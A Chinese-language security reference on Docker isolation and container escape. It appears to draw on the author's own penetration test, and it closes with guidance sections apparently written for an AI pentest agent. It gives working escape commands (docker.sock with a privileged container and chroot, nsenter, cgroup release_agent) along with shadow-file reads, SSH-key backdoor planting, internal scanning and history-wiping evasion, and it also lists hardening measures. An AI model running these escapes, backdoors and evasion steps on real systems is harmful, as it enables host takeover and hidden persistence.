# Docker 容器安全 — 隔离机制、逃逸技术与攻击面

> Level 0: 基础原理 / 网络安全
> 基于实战：DVWA渗透 → Worker容器 → docker.sock → 宿主机全控

---

## 一、Docker 安全机制

### 1.1 隔离架构

```
┌──────────────────────────────────────────────────────────┐
│                   宿主机 (Host Kernel)                     │
│                                                          │
│  ┌────────────────┐  ┌─────────────────┐                │
│  │  Namespaces    │  │   Cgroups       │                │
│  │  (命名空间隔离)  │  │  (资源限制)      │                │
│  │  ┌───────────┐ │  │  ┌───────────┐  │                │
│  │  │ PID       │ │  │  │ CPU       │  │                │
│  │  │ Network   │ │  │  │ Memory    │  │                │
│  │  │ Mount     │ │  │  │ Disk IO   │  │                │
│  │  │ UTS       │ │  │  │ Network   │  │                │
│  │  │ IPC       │ │  │  │ PID       │  │                │
│  │  │ User      │ │  │  │           │  │                │
│  │  │ Cgroup    │ │  │  │           │  │                │
│  │  └───────────┘ │  │  └───────────┘  │                │
│  └────────────────┘  └─────────────────┘                │
│                                                          │
│  ┌─────────────────────────────────────────────────┐    │
│  │            Capabilities (能力限制)                │    │
│  │  默认只授予必要能力，如 CHOWN/DAC_OVERRIDE/FOWNER  │    │
│  └─────────────────────────────────────────────────┘    │
│                                                          │
│  ┌─────────────────────────────────────────────────┐    │
│  │  Seccomp / AppArmor / SELinux (强制访问控制)      │    │
│  └─────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────┘
```

### 1.2 关键隔离机制

| 机制 | 作用 | 绕过方式 |
|:----|:-----|:---------|
| **PID Namespace** | 隔离进程视图，容器内看不到宿主机进程 | 特权容器可看到所有 |
| **Network Namespace** | 隔离网络栈，容器有独立 IP | `--network host` 共享宿主机网络 |
| **Mount Namespace** | 隔离文件系统挂载 | 挂载宿主机目录（如 `/`）可绕过 |
| **User Namespace** | 映射容器内 root 到非 root 用户 | 默认关闭，root 在容器内=宿主机 uid 0 |
| **Capabilities** | 细化 root 权限 | 授予 `SYS_ADMIN` 等危险 cap 可逃逸 |
| **Seccomp** | 限制系统调用 | 默认配置文件允许大部分常见 syscall |
| **Read-only Rootfs** | 容器内文件系统只读 | tmpfs 挂载点仍可写 |

### 1.3 Docker 默认 Capabilities

容器默认拥有约 14 个能力（比完整 root 的 38 个少很多），其中最危险的有：

| Capability | 危险等级 | 说明 |
|:-----------|:--------:|:------|
| `CAP_CHOWN` | 低 | 修改文件所有者 |
| `CAP_DAC_OVERRIDE` | **中** | 绕过文件读/写权限检查（可读任何文件）|
| `CAP_FOWNER` | 中 | 绕过文件操作权限检查 |
| `CAP_NET_RAW` | 低 | 原始套接字（可 ping） |
| `CAP_SETUID` | 中 | 设置用户 ID（可提权） |
| `CAP_SETGID` | 中 | 设置组 ID |
| | | |
| **危险能力（容器默认不包含）** | | |
| `CAP_SYS_ADMIN` | **致命** | 几乎等于宿主 root，可挂载、命名空间操作 |
| `CAP_SYS_PTRACE` | **高** | 可 ptrace 其他进程 |
| `CAP_SYS_MODULE` | **高** | 可加载内核模块 |
| `CAP_NET_ADMIN` | **高** | 网络配置权限 |
| `CAP_SYS_RAWIO` | **高** | 原始 I/O 操作 |

---

## 二、容器逃逸技术

### 2.1 技术分类

```
容器逃逸
├── ① Docker Socket 攻击（最常用，设计级漏洞）
│   └── 宿主机挂载 /var/run/docker.sock → 创建特权容器
├── ② Capabilities 逃逸
│   ├── CAP_SYS_ADMIN → mount + nsenter
│   ├── CAP_SYS_PTRACE → 注入宿主机进程
│   └── CAP_NET_ADMIN → 网络操作
├── ③ Mount 逃逸
│   ├── 宿主机 / 挂载 → 直接读写宿主文件系统
│   ├── /proc/1/root → 通过 proc 访问宿主文件
│   └── /dev/sdXN → 访问宿主机磁盘设备
├── ④ Runtime 漏洞
│   ├── CVE-2019-5736 (runc 覆盖)
│   ├── CVE-2024-21626 (runc 路径遍历)
│   └── CVE-2025-9074 (Docker Desktop 逃逸)
├── ⑤ cgroup 逃逸
│   └── release_agent + notify_on_release
└── ⑥ 内核漏洞
    └── DirtyPipe / DirtyCow → 宿主机内核提权
```

### 2.2 Docker Socket 攻击（最常见）

**原理：** Docker CLI 通过 Docker socket (`/var/run/docker.sock`) 与 Docker daemon 通信。如果容器内挂载了这个 socket，容器内的进程就相当于有了 Docker daemon 的 root 权限。

```
容器内：
  ls -la /var/run/docker.sock
  → srw-rw---- 1 root docker 0 ... docker.sock  ✅ 已挂载

逃逸步骤：
  1. docker run -it --privileged --pid=host -v /:/host ubuntu chroot /host
  ┌─ --privileged: 授予所有 capabilities
  ├─ --pid=host: 共享宿主 PID 命名空间
  └─ -v /:/host: 挂载宿主根目录

  2. 进入容器后：
     chroot /host
     → 直接获得宿主机 root
```

**实战案例**（我们的渗透）：

```
DVWA RCE (www-data)
  → 发现 /var/run/docker.sock 在容器内
  → 检查 docker 命令可用性
  → docker run --privileged -v /:/host ubuntu bash
  → chroot /host
  → cat /etc/shadow
  → 植入 SSH 公钥后门
  → 宿主机 (192.168.1.180) 完全控制
```

### 2.3 CAP_SYS_ADMIN + nsenter 逃逸

即使没有 docker.sock，如果有 `CAP_SYS_ADMIN` 能力，可以用 `nsenter`：

```bash
# 容器内检查能力
cat /proc/1/status | grep CapEff
capsh --decode=00000000xxxxxxxx

# 如果包含 CAP_SYS_ADMIN
nsenter --target 1 --mount --uts --ipc --pid -- bash
# → 进入宿主机的命名空间，获得宿主机 root
```

### 2.4 宿主机目录挂载逃逸

```bash
# 检查挂载点
mount | grep -E "(/data|/host|/mnt)"
findmnt

# 如果宿主机 / 被挂载
chroot /path/to/host/root
cat /etc/shadow
```

### 2.5 cgroup release_agent 逃逸

```bash
# 容器内
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# 找到宿主机路径
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 设置 release_agent 指向 payload
echo "$host_path/escape.sh" > /tmp/cgrp/release_agent

# 触发
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

---

## 三、容器内部网络

### 3.1 Docker 网络模式

| 模式 | 描述 | 安全含义 |
|:----|:-----|:---------|
| **bridge** (默认) | 独立网络命名空间，veth 对连接 | 默认隔离，但同一 bridge 的容器互通 |
| **host** | 共享宿主机网络栈 | 容器可访问宿主机所有端口 |
| **none** | 无网络 | 完全隔离 |
| **macvlan/ipvlan** | 分配物理网络 IP | 直接暴露到物理网络 |
| **overlay** | 跨主机网络 | Swarm/K8s |

### 3.2 容器间通信（同一 bridge）

```
容器 A (172.18.0.2) ──┐
                       ├── docker bridge (172.18.0.x/16) ← 默认互通！
容器 B (172.18.0.3) ──┘

# 没有防火墙！容器间所有端口开放
# redis 无密码 → 容器 A 可直接连接容器 B Redis
# API 服务 → 容器 A 可直接调用容器 B 的 API
```

**关键安全发现：** 同一 Docker bridge 网络上的容器默认 **无任何网络隔离**。所有端口向同一网络内的所有容器开放。这本质上是"内部网络扁平化"。

### 3.3 容器内部网络拓扑发现

```
# 从已控容器扫描整个 Docker 网络
for i in $(seq 1 254); do
  ping -c 1 -W 1 172.18.0.$i >/dev/null 2>&1 && echo "172.18.0.$i is up"
done

# 或使用 nmap (需要 CAP_NET_RAW)
nmap -sn 172.18.0.0/24

# 识别服务
nmap -sV 172.18.0.2 -p 6379  # Redis
nmap -sV 172.18.0.10 -p 8000 # Backend API
nmap -sV 172.18.0.3 -p 5432  # PostgreSQL
```

---

## 四、Docker 常见安全配置错误

| 错误配置 | 风险等级 | 攻击路径 |
|:---------|:--------:|:---------|
| `/var/run/docker.sock` 挂载到容器 | **致命** | 直接逃逸到宿主机 |
| `--privileged` 运行容器 | **致命** | 所有 cap + 设备访问 |
| `CAP_SYS_ADMIN` | **高** | nsenter 逃逸 |
| `--pid=host` | **高** | 看到宿主机所有进程 |
| `--network=host` | **高** | 共享宿主机网络 |
| `--cap-add=SYS_PTRACE` | **高** | ptrace 注入 |
| 容器 root = 宿主机 uid 0 | **中** | 缺乏 User Namespace 映射 |
| 敏感目录挂载 (`/data`, `/etc`) | **中** | 直接读取宿主机敏感文件 |
| Redis/Memcached 无密码 | **高** | 数据泄露+SSRF跳板 |
| docker-compose.yml 泄露 | **中** | 密码、配置全泄露 |

---

## 五、Docker 日志与监控绕过

| 技术 | 说明 |
|:----|:------|
| 日志不写入容器文件系统 | 使用 tmpfs 或直接写 socket |
| 禁用 bash_history | `ln -sf /dev/null ~/.bash_history` |
| 清除 docker 事件 | `docker events` 只记录 API 调用，不记录容器内操作 |
| Caps 滥用不留文件 | `nsenter` 用内存操作，无文件痕迹 |
| 隐藏进程 | 容器内的进程对宿主机可见（除非特殊配置） |

---

## 六、实战案例映射

| 我们的实战 | 对应技术 |
|:----------|:---------|
| DVWA RCE → 发现 docker.sock | Docker Socket 攻击 |
| Worker 容器有 docker.sock | 设计级漏洞（每个容器都有） |
| Redis 172.18.0.2 无密码 | 容器内网扁平化 |
| 容器逃逸到宿主机 aikaifa | Docker Socket 逃逸 |
| 宿主机 SSH 后门植入 | 逃逸后的持久化 |
| docker-compose.yml 泄露 | 配置文件暴露 |
| 172.18.0.x 11个容器全发现 | 内网扫描+服务识别 |

---

## 七、防御建议

| 措施 | 级别 | 效果 |
|:----|:----:|:-----|
| 不挂载 docker.sock 到容器 | **必须** | 阻断最常用逃逸路径 |
| 启用 User Namespace Remapping | 推荐 | 容器 root ≠ 宿主机 uid 0 |
| 使用 Read-only Rootfs | 推荐 | 阻止容器写文件系统 |
| 限制 Capabilities（最小权限） | 必须 | 只给必要能力 |
| 使用 Seccomp 配置文件 | 推荐 | 限制 syscall |
| 启用 AppArmor/SELinux | 推荐 | 额外 MAC 层控制 |
| 容器间网络隔离（自定义网络策略） | 必须 | 阻断内网扁平化 |
| 定期扫描镜像漏洞 | 推荐 | 发现已知 CVE |
| 禁用 `--privileged` 标志 | 必须 | 禁止全部能力 |
| 设置 Docker 守护进程 TLS 认证 | 推荐 | 阻断远程 API 未授权访问 |

---

## 参考

- [Docker Security Documentation](https://docs.docker.com/engine/security/)
- [CVE-2019-5736: runc Escape](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)
- [CVE-2024-21626: runc Path Traversal](https://nvd.nist.gov/vuln/detail/CVE-2024-21626)
- [CVE-2025-9074: Docker Desktop Escape](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
- [Container Security: Techniques, Misconfigurations, and Attack Path](https://offensivebytes

---

## 【LLM 推理段 — Docker 容器逃逸】

### 触发条件
- 目标在 Docker 容器内运行（检测: /.dockerenv 文件、cgroup 中有 docker 字样）
- 容器以特权模式运行或挂载了敏感目录

### 检测信号
| 信号 | 说明 | 置信度 | 检测方法 |
|------|------|--------|---------|
| 特权模式 | --privileged 启动 | 高 | cat /proc/self/status | grep CapEff |
| 挂载 Docker Socket | /var/run/docker.sock 可写 | 极高 | ls -la /var/run/docker.sock |
| 挂载宿主机目录 | -v /:/host | 高 | 查看 cat /proc/mounts 或 ls 可访问路径 |
| Capabilities | CAP_SYS_ADMIN、CAP_NET_ADMIN 等 | 中 | capsh --print |
| cgroup 逃逸 | cgroup v1 notify_on_release | 高 | 检查 cgroup 配置 |

### 验证步骤（按优先级）
1. **检查特权模式**: `cat /proc/self/status | grep CapEff` -> 值含 0000003fffffffff 或类似全 1 -> 特权模式
2. **检查 Docker Socket**: `ls -la /var/run/docker.sock` -> 可读写 -> 逃逸确认
3. **检查挂载**: `mount | grep /dev/sda` 或 `cat /proc/1/mountinfo` -> 看到宿主机路径 -> 逃逸确认
4. **尝试逃逸**: 特权模式下 `mount -t proc none /proc` -> fdisk -l 查看宿主机磁盘 -> chroot 到宿主机

### 利用链扩展
| 条件 | 利用方式 | 后续攻击面 |
|------|---------|-----------|
| Docker Socket 可写 | docker run -v /:/host 启动新容器 | 宿主机完全控制 |
| 特权模式 | 挂载宿主机磁盘、加载内核模块 | 宿主机沦陷 |
| 宿主机目录挂载 | 写 SSH 公钥到 /root/.ssh/ | 宿主机 SSH 登录 |
| CAP_SYS_ADMIN | mount 宿主机 cgroup 逃逸 | 容器外代码执行 |

### 常见误判
- 看到 /var/run/docker.sock 存在但不可写 -> 不是漏洞
- 容器内看到宿主机进程（--pid=host）但不是特权模式 -> 信息泄露但非逃逸

---

## 【LLM 推理段 — 容器不安全配置】

### 触发条件
- 目标在容器内运行

### 检测信号
| 配置项 | 检查方法 | 风险 | 影响 |
|--------|---------|------|------|
| 未分配 user namespace | 容器内依然有 CAP_NET_BIND_SERVICE | 中 | 权限过大 |
| 未限制内存/CPU | cgroup 无限制 | 低 | DoS 风险 |
| 网络模式为 host | ip addr 看到宿主机 IP | 高 | 网络隔离失效 |
| 使用 root 用户运行 | whoami 为 root | 中 | 提权更容易 |

### 验证步骤
1. 容器内 `ip addr` 检查网络模式
2. `whoami` 检查用户身份
3. `capsh --print` 检查 capabilities

### 利用链扩展
- host 网络 + 根用户 -> 可监听宿主机端口、ARP 欺骗、中间人攻击
